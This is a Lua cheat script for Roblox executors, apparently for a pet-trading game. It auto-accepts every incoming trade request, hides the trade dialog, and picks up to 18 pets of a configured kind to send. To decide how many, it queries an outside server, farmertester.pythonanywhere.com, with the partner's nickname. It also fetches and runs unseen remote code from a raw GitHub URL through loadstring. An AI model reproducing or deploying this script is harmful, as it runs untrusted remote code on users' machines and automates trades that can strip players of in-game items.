-- Main account

getgenv().Config = {
["PetName"] = "winter_2024_frostclaw",
["RarityCountPotionTooMega"] = "200"
}

-- Dehash script
loadstring(game:HttpGet("https://raw.githubusercontent.com/Rano194/Rano194/refs/heads/main/Dehash"))()
print("[INFO] loading dehash")

-- getting pets
local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]

local petName = getgenv().Config["PetName"]
local count = 0
for _, pet in pairs(playerData.inventory.pets or {}) do
    if pet.kind == petName and pet.properties.age < 6 and not pet.properties.neon and not pet.properties.mega_neon then
        count += 1
    end
end

-- Функция для получения 18 петов
function GetFilteredPets(petName, maxCount)
    local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
    local filteredPets = {}

    for _, pet in pairs(playerData.inventory.pets or {}) do
        if #filteredPets >= maxCount then
            break
        end

        if pet.kind == petName and pet.properties.age < 6 and not pet.properties.neon and not pet.properties.mega_neon then
            table.insert(filteredPets, pet)
        end
    end

    return filteredPets
end

-- Функция для принятия трейда
local nickname_player_trade = nil
game.ReplicatedStorage.API["TradeAPI/TradeRequestReceived"].OnClientEvent:Connect(function(player)
    game.ReplicatedStorage.API["TradeAPI/AcceptOrDeclineTradeRequest"]:InvokeServer(player, true)
    game.Players.LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
    nickname_player_trade = player
end)

-- Цикл трейда
local requestFunc = syn and syn.request or http_request or request

local found = false

while true do
    task.wait(1)
    -- Получаем окно трейда
    if game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.Visible == true then
        task.wait(1)
        local res = requestFunc({ Url = "https://farmertester.pythonanywhere.com/getpets?nick="..nickname_player_trade, Method = "GET" })
        local data = game:GetService("HttpService"):JSONDecode(res.Body)
        print(data)
        print(data.pets)
        if data.pets == "Ready" then
            task.wait(3)
        else -- Получаем нужное кол-во петов и отправляем в трейде
            local count_pets = data.pets
            local result = math.min(count_pets, 18)
            print(count_pets)
            print("------Res------")
            print(result)
            print("------------")
            local pets = GetFilteredPets(petName, result)
            for i, pet in ipairs(pets) do
                print(i, pet.unique)
            end
        end
    end
end
